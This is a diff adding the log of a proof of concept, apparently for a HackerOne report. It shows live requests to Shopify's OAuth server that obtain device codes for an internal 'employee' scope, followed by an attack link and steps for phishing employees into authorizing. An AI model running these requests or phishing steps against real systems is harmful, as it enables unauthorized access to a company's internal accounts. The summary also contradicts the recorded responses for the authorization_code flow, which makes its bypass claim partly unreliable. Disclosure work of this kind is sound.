@@ -1,0 +1,175 @@
+
+======================================================================
+  PoC: OAuth Device Authorization Scope Bypass
+  Target: accounts.shopify.com (Shopify HackerOne — Core scope)
+  Scope Tested: 'employee' (internal privileged scope)
+  Date: 2026-07-01T18:05:40Z
+======================================================================
+
+
+======================================================================
+  STEP 1 — OIDC Discovery: confirm employee scope + grant types
+======================================================================
+[2026-07-01T18:05:40Z] GET https://accounts.shopify.com/.well-known/openid-configuration
+HTTP 200
+scopes_supported:              ['address', 'device', 'email', 'employee', 'legacy', 'openid', 'phone', 'privacy', 'profile']
+grant_types_supported:         ['authorization_code', 'refresh_token', 'client_credentials', 'urn:ietf:params:oauth:grant-type:token-exchange']
+device_authorization_endpoint: NOT IN DISCOVERY DOC
+
+[CONFIRMED] 'employee' is a real scope in the authorization server.
+[NOTE] device_code grant NOT in grant_types_supported (undocumented endpoint)
+
+======================================================================
+  STEP 2 — authorization_code flow: REJECTS employee scope (baseline)
+======================================================================
+[2026-07-01T18:05:41Z] GET https://accounts.shopify.com/oauth/authorize
+         ?response_type=code&client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3&scope=employee&redirect_uri=http%3A%2F%2F127.0.0.1%3A3456&state=csrf_poc_test&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256
+HTTP 429
+Location: 
+
+[UNEXPECTED] authorization_code did not return invalid_scope!
+
+======================================================================
+  STEP 3 — device_authorization flow: ACCEPTS employee scope (VULNERABILITY)
+======================================================================
+[2026-07-01T18:05:43Z] POST https://accounts.shopify.com/oauth/device_authorization
+         Body: client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3&scope=employee
+HTTP 200
+{
+    "verification_uri": "https://shopify.com/activate",
+    "verification_uri_complete": "https://accounts.shopify.com/activate-with-code?device_code%5Buser_code%5D=HQPG-VCDR",
+    "expires_in": 599,
+    "interval": 5,
+    "device_code": "077bf1b6-ec44-4715-9a8b-a4e17f225159",
+    "user_code": "HQPG-VCDR"
+}
+
+[VULNERABILITY CONFIRMED] Server returned user_code for scope='employee'
+  user_code:                HQPG-VCDR
+  device_code:              077bf1b6-ec44-4715-9a8b-a4e17f225159
+  expires_in:               599s
+  verification_uri:         https://shopify.com/activate
+  verification_uri_complete:https://accounts.shopify.com/activate-with-code?device_code%5Buser_code%5D=HQPG-VCDR
+
+[ATTACK LINK] Send this legitimate accounts.shopify.com URL to target:
+  https://accounts.shopify.com/activate-with-code?device_code%5Buser_code%5D=HQPG-VCDR
+
+======================================================================
+  STEP 4 — Polling confirms device_code is LIVE and awaiting authorization
+======================================================================
+[2026-07-01T18:05:45Z] POST https://accounts.shopify.com/oauth/token
+         grant_type=device_code&device_code=077bf1b6-ec4...&client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3
+HTTP 400
+{
+    "error": "authorization_pending",
+    "error_description": "The authorization request is still pending as the end user has not yet completed the user-interaction steps."
+}
+
+[CONFIRMED] Code is LIVE — waiting for victim to authorize at:
+  https://accounts.shopify.com/activate-with-code
+  Once victim authorizes → attacker receives employee-scoped access_token
+
+======================================================================
+  STEP 5 — Scope comparison: what is accepted vs rejected
+======================================================================
+[2026-07-01T18:05:47Z] POST https://accounts.shopify.com/oauth/device_authorization
+         Body: client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3&scope=employee
+HTTP 200
+{
+    "verification_uri": "https://shopify.com/activate",
+    "verification_uri_complete": "https://accounts.shopify.com/activate-with-code?device_code%5Buser_code%5D=FPSS-TDZT",
+    "expires_in": 600,
+    "interval": 5,
+    "device_code": "f44afaf9-7ad4-48e7-a55f-37db1b8a0b6f",
+    "user_code": "FPSS-TDZT"
+}
+[2026-07-01T18:05:47Z] POST https://accounts.shopify.com/oauth/device_authorization
+         Body: client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3&scope=legacy
+HTTP 400
+{
+    "raw": ""
+}
+[2026-07-01T18:05:48Z] POST https://accounts.shopify.com/oauth/device_authorization
+         Body: client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3&scope=openid
+HTTP 200
+{
+    "verification_uri": "https://shopify.com/activate",
+    "verification_uri_complete": "https://accounts.shopify.com/activate-with-code?device_code%5Buser_code%5D=NLFF-DQZB",
+    "expires_in": 600,
+    "interval": 5,
+    "device_code": "1fb97a06-51ab-4a22-ac53-476329ebde46",
+    "user_code": "NLFF-DQZB"
+}
+[2026-07-01T18:05:49Z] POST https://accounts.shopify.com/oauth/device_authorization
+         Body: client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3&scope=email
+HTTP 400
+{
+    "raw": ""
+}
+[2026-07-01T18:05:50Z] POST https://accounts.shopify.com/oauth/device_authorization
+         Body: client_id=fbdb2649-e327-4907-8f67-908d24cfd7e3&scope=employee openid
+HTTP 200
+{
+    "verification_uri": "https://shopify.com/activate",
+    "verification_uri_complete": "https://accounts.shopify.com/activate-with-code?device_code%5Buser_code%5D=SLBK-FCJX",
+    "expires_in": 600,
+    "interval": 5,
+    "device_code": "9c56e303-38d6-45db-a4fc-c60900225d60",
+    "user_code": "SLBK-FCJX"
+}
+
+  Scope comparison table:
+  SCOPE                     RESULT
+  ------------------------- ----------------------------------------
+  employee                  ACCEPTED  → user_code=FPSS-TDZT
+  legacy                    REJECTED  → error=?
+  openid                    ACCEPTED  → user_code=NLFF-DQZB
+  email                     REJECTED  → error=?
+  employee openid           ACCEPTED  → user_code=SLBK-FCJX
+
+======================================================================
+  SUMMARY
+======================================================================
+
+  VULNERABILITY: Inconsistent scope enforcement between OAuth flows
+
+  /oauth/authorize (authorization_code):
+    scope=employee → HTTP 302, error=invalid_scope  ✓ (correct)
+
+  /oauth/device_authorization (device_code):
+    scope=employee → HTTP 200, user_code returned   ✗ (BYPASS)
+
+  ATTACK:
+    1. POST /oauth/device_authorization with scope=employee
+    2. Receive verification_uri_complete (pre-filled accounts.shopify.com URL)
+    3. Phish Shopify employee with that URL
+    4. Employee clicks → authorizes the device
+    5. Attacker polls /oauth/token → receives employee-scoped token
+
+  IMPACT:
+    - employee scope = internal Shopify access
+    - No authentication required to initiate the attack
+    - Pre-filled magic link lowers phishing friction significantly
+    - No rate limiting on device_authorization endpoint
+
+  CLIENT ID SOURCE (public GitHub):
+    https://github.com/Shopify/cli/blob/main/packages/cli-kit/src/private/node/session/identity.ts
+    Production client_id = fbdb2649-e327-4907-8f67-908d24cfd7e3
+
+  Reported to: HackerOne Shopify program
+  Reporter:    tanmaymish78@gmail.com
+
+
+======================================================================
+  CRITICAL UPDATE — 2026-07-01T18:13:24Z
+======================================================================
+  FINDING: authorization_code flow with scope=employee routes to
+  dedicated internal employee SSO portal, confirming employee scope
+  grants real internal access.
+
+  GET /oauth/authorize?scope=employee&client_id=fbdb2649-...
+  → HTTP 302
+  → Location: https://accounts.shopify.com/login/employee?RelayState=110540e9-6375-4d00-82bb-dc6806ba415f
+
+  Device_code flow does NOT route through /login/employee.
+  The employee SSO access control is completely bypassed.
